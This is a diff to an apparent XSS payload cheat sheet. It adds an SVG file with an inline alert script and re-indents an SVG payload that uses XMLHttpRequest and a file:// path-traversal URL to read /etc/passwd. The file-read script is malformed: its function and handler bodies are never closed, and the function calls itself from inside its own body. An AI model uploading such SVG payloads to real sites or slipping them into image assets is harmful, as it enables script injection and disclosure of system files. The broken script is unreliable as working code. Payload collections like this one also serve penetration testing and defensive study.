@@ -121,27 +121,34 @@ After getting your xss alert box, what's next? This is not usually enough to "sh
   ```
 
 ## Images
-- SVG Xss
-  ```html
-  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg xmlns="http://www.w3.org/2000/svg">
-   <script>
-      function readTextFile(file){
-         var rawFile = new XMLHttpRequest();
-         rawFile.open("GET", file, false);
-         rawFile.onreadystatechange = function ()
-      {
-
-      if(rawFile.readyState === 4){
-         if(rawFile.status === 200 || rawFile.status == 0){
-            var allText = rawFile.responseText;
-            alert(allText);
-         }
-      }
-
-     rawFile.send(null);
-     readTextFile("file:///../../../../../../../../../etc/passwd");
-   </script>
+- SVG basic alert(1)
+```
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <script type="text/javascript">alert("XSS")</script>
 </svg>
+```
+
+- SVG Xss (read file)
+```
+  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+    <svg xmlns="http://www.w3.org/2000/svg">
+     <script>
+        function readTextFile(file){
+           var rawFile = new XMLHttpRequest();
+           rawFile.open("GET", file, false);
+           rawFile.onreadystatechange = function ()
+        {
+
+        if(rawFile.readyState === 4){
+           if(rawFile.status === 200 || rawFile.status == 0){
+              var allText = rawFile.responseText;
+              alert(allText);
+           }
+        }
+
+       rawFile.send(null);
+       readTextFile("file:///../../../../../../../../../etc/passwd");
+     </script>
+  </svg>
 ```
 
